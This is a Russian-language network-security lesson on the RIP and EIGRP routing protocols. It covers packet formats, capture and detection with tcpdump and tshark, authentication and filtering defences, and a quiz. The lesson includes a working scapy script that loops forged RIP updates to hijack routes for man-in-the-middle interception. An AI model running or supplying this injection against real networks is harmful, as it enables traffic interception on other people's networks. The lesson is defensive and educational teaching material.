---
id: network-rip-eigrp
title: "RIP и EIGRP: дистанционно-векторные протоколы и их инъекции"
category: network
parent: network-module-routing
difficulty: medium
order: 1
tags: [network, rip, eigrp, routing, injection, distance-vector]
prerequisites: [network-module-routing, network-routing]
useful_for:
  - "CTF Network (дампы RIP/EIGRP)"
  - "Пентест: инъекция маршрутов в сегменте"
  - "Работа (SOC): детект поддельных update"
estimated_minutes: 55
summary: "Как работают RIP и EIGRP, как выглядят их пакеты, почему поддельные update уводят трафик и как защититься аутентификацией и фильтрацией."
---

RIP и EIGRP — протоколы, которые «рассказывают соседям» о маршрутах. Если аутентификации нет (а её часто нет), любой хост в сегменте может объявить себя шлюзом к чужой сети — и трафик пойдёт через него. Урок продолжает [`network-module-routing`](network-module-routing).

## RIP: дистанционно-векторный протокол

RIP распространяет маршруты как «вектор расстояния»: сеть + число хопов. Правила:

- максимум **15 хопов** (16 = недостижимо);
- обновления каждые **30 секунд** (RIP) multicast на `224.0.0.9` (RIPv2);
- метрика — только число хопов (не учитывает скорость).

```bash
# Захватить RIP-обновления
sudo tcpdump -i eth0 -nn 'udp port 520'
# Разбор в Wireshark: фильтр rip
tshark -r cap.pcap -Y 'rip' -V | grep -E "Command|IP Address|Metric" | head
```

## Формат RIPv2 и аутентификация

RIPv2-пакет: команда (1=request, 2=response), версия, затем до 25 записей «AFI, route tag, IP, mask, next hop, metric». В RIPv2 есть опция **аутентификации** (простой пароль или MD5), но она часто не включена.

```text
+--------+--------+----------------+------------------+
| Command| Version| (auth entry?)  | Route entries... |
+--------+--------+----------------+------------------+
```

## EIGRP: гибридный протокол

EIGRP (Cisco) — «гибрид»: считает метрику по **bandwidth** и **delay** (а также load/reliability), поддерживает соседство через Hello. Пакеты EIGRP идут по IP-протоколу **88**. Типы: Hello, Update, Query, Reply, Ack.

```bash
# Захватить EIGRP
sudo tcpdump -i eth0 -nn 'ip proto 88'
tshark -r cap.pcap -Y 'eigrp' -V | head -40
```

## Атака: поддельные update

Атакующий отправляет RIP-ответ или EIGRP-update с выгодной метрикой (например, 0 хопов) и объявляет себя следующим хопом к сети жертвы. Соседи обновляют RIB и направляют трафик через атакующего.

```bash
# RIP-инъекция через scapy (лаборатория)
python3 - <<'PY'
from scapy.all import *
rip = RIP(cmd=2) / RIPEntry(AFI=2, addr="10.20.0.0", mask="255.255.0.0", metric=1)
send(IP(dst="224.0.0.9")/UDP(sport=520,dport=520)/rip, loop=1, inter=5)
PY
```

Для EIGRP инъекция сложнее (нужен корректный формат TLV), но принцип тот же — подделать Update с лучшей метрикой.

## Практика: обнаружить инъекцию

```bash
# 1. Захватить update и найти аномальный next hop
tshark -r cap.pcap -Y 'rip.cmd==2' -T fields -e ip.src -e rip.ip -e rip.metric | head
# 2. Смотреть частоту: легитимные update раз в 30 с
tshark -r cap.pcap -Y 'rip.cmd==2' -T fields -e frame.time | head -20
# 3. EIGRP: искать неожиданного соседа
tshark -r cap.pcap -Y 'eigrp.opcode==5' -T fields -e ip.src | sort | uniq -c
```

Признаки атаки: update с metric=0/1 от неизвестного источника, всплеск частоты, «новый» next hop.

## Защита

| Мера | Против чего |
|---|---|
| Аутентификация RIPv2/EIGRP (MD5/SHA) | поддельные update |
| Пассивные интерфейсы (`passive-interface`) | отправка update наружу |
| Фильтрация протоколов на периметре | инъекции извне |
| Не использовать RIP в больших сетях | слабость метрики |
| Мониторинг RIB-изменений | детект hijack |

```text
# Cisco: аутентификация RIPv2
key chain RIPKEY
 key 1
  key-string Secret123
interface Gi0/1
 ip rip authentication mode md5
 ip rip authentication key-chain RIPKEY
```

## Частые ошибки

- **Игнорировать passive-interface** — update утекают во все порты.
- **Не включать аутентификацию** — инъекция тривиальна.
- **Путать RIP v1 (broadcast) и v2 (multicast)** — разная фильтрация.
- **Считать EIGRP «закрытым»** — формат известен, инъекция возможна.
- **Не считать baseline частоты** — аномалию не увидеть.
- **Забывать про route tag** — его можно использовать для политик.
- **Доверять «своему» источнику** — спуфинг src никто не проверяет.

## Что дальше / решение

После RIP/EIGRP переходите к [`network-mpls-vrf`](network-mpls-vrf). Для OSPF/BGP — [`network-routing`](network-routing) и [`network-bgp-hijack`](network-bgp-hijack).

## Формат пакета EIGRP

EIGRP-заголовок: opcode (Hello=5, Update=1, Query=3, Reply=4), checksum, AS-номер, затем TLVs. Метрика считается по bandwidth, delay, load, reliability.

| Поле | Смысл |
|---|---|
| Opcode | тип сообщения |
| Autonomous System | номер AS (должен совпадать) |
| K-values | какие компоненты метрики учитывать |
| TLV 0x0102 | параметры маршрута (next hop, метрика) |

```bash
# Разобрать EIGRP-пакеты
tshark -r cap.pcap -Y 'eigrp' -T fields -e eigrp.opcode -e ip.src | sort | uniq -c
# Найти Hello-соседей
tshark -r cap.pcap -Y 'eigrp.opcode==5' -T fields -e ip.src | sort -u
```

## Лаборатория: FRR + RIP

```bash
# Поднять RIP на Linux (FRR)
sudo vtysh -c 'configure terminal' -c 'router rip' -c 'version 2' \
  -c 'network 10.0.0.0/24'
# Наблюдать обновления
sudo tcpdump -i eth0 -nn 'udp port 520'
# Показать маршруты RIP
sudo vtysh -c 'show ip route rip'
# Включить аутентификацию (защита)
sudo vtysh -c 'configure terminal' -c 'key chain K' -c 'key 1' -c 'key-string S3cret'
```

Без аутентификации инъекция RIP занимает секунды: scapy-пакет с metric=1 заставляет соседей направить трафик через атакующего.

## Чек-лист RIP/EIGRP

1. Работает ли RIP/EIGRP в сегменте (520/udp, proto 88)?
2. Включена ли **аутентификация**?
3. Настроены ли **passive-interface**?
4. Какова частота update — есть ли аномалии?
5. Появляются ли **новые соседи** (Hello)?
6. Фильтруются ли протоколы на **периметре**?
7. Мониторится ли **изменение RIB**?

```bash
# Быстрый снимок
sudo tcpdump -i eth0 -nn -c 10 'udp port 520 or ip proto 88'
ip route show | head
```

RIP и EIGRP редко встречаются в современных крупных сетях, но в промышленных и устаревших сегментах они живы — и там почти всегда без аутентификации.

## Сравнение RIP, OSPF и EIGRP

| Свойство | RIP | OSPF | EIGRP |
|---|---|---|---|
| Тип | distance-vector | link-state | hybrid |
| Метрика | хопы | cost (bandwidth) | bandwidth/delay |
| Транспорт | UDP/520 | IP proto 89 | IP proto 88 |
| Сходимость | медленная | быстрая | быстрая |
| Масштаб | малый | большой | большой |
| Аутентификация | MD5 (v2) | MD5/SHA | MD5/SHA |
| Вендор | все | все | Cisco |

```bash
# Определить, какой протокол в сегменте
sudo tcpdump -i eth0 -nn -c 20 'udp port 520 or ip proto 89 or ip proto 88'
# Сводка по протоколам в дампе
tshark -r cap.pcap -T fields -e ip.proto | sort | uniq -c | sort -rn | head
```

## Диагностика и защита

```bash
# FRR: состояние соседей
sudo vtysh -c 'show ip rip status'
sudo vtysh -c 'show ip eigrp neighbors'
# Включить passive-interface (не слать update наружу)
sudo vtysh -c 'configure terminal' -c 'passive-interface eth0'
```

Чек-лист защиты:

1. Включить **аутентификацию** update.
2. Настроить **passive-interface** на всех «крайних» портах.
3. Фильтровать протоколы маршрутизации на **периметре** (ACL по 520/udp, proto 88/89).
4. Ограничить **redistribute** (не тянуть внешние маршруты без нужды).
5. Мониторить **новых соседей** и всплески update.
6. Вести **baseline** маршрутов и сравнивать.

```bash
# Быстрая проверка на инъекцию: всплеск update
tshark -r cap.pcap -Y 'rip.cmd==2' -T fields -e frame.time_relative | head -20
```

Ключевой вывод: и RIP, и EIGRP аутентифицируются, но по умолчанию — нет. Включение MD5/SHA и passive-interface закрывает почти все практические векторы инъекции.

## Квиз

```quiz
- question: "Какова максимальная метрика в RIP?"
  options:
    - "15 (16 = недостижимо)"
    - "255"
    - "65535"
    - "нет предела"
  answer: 0
  explanation: "RIP считает хопы; 16 означает недостижимость."
- question: "Какой multicast используется RIPv2?"
  options:
    - "224.0.0.9"
    - "224.0.0.5"
    - "239.0.0.1"
    - "224.0.0.10"
  answer: 0
  explanation: "RIPv2 шлёт обновления на 224.0.0.9:520."
- question: "По какому IP-протоколу работает EIGRP?"
  options:
    - "88"
    - "89"
    - "6"
    - "17"
  answer: 0
  explanation: "EIGRP использует IP protocol 88."
- question: "Как атакующий уводит трафик через RIP?"
  options:
    - "Отправляет response с лучшей (малой) метрикой"
    - "Шифрует update"
    - "Отключает DNS"
    - "Меняет MAC"
  answer: 0
  explanation: "Ложный маршрут с метрикой 0/1 побеждает в RIB."
- question: "Какая защита делает инъекцию RIP сложнее?"
  options:
    - "Аутентификация RIPv2 (MD5)"
    - "Включение IPv6"
    - "VLAN 1"
    - "STP"
  answer: 0
  explanation: "Подписанные update нельзя подделать без ключа."
```

## Где пригодится

- **CTF:** дампы RIP/EIGRP, поиск аномального next hop.
- **Пентест:** инъекция маршрутов для MITM.
- **SOC:** детект поддельных update и новых соседей.
- **Инженерия:** аутентификация и passive-interface.
